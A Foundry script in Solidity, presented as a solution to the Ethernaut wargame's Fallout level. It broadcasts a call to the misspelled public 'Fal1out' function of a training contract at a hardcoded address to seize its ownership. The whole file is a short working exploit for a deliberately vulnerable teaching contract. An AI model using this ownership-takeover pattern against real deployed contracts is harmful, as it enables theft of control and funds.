// SPDX-License-Identifier: CC-BY-4.0
// bt3gl's solution to ethernaut

pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {Fallout} from "src/02/Fallout.sol";

contract Exploit is Script {

      address instance = 0xAADB92d23788EA81c46fe22C4d4771B23dcc96a2;
      Fallout level = Fallout(payable(address(instance)));

      function run() external {

          vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

          level.Fal1out();

          vm.stopBroadcast();
    }
}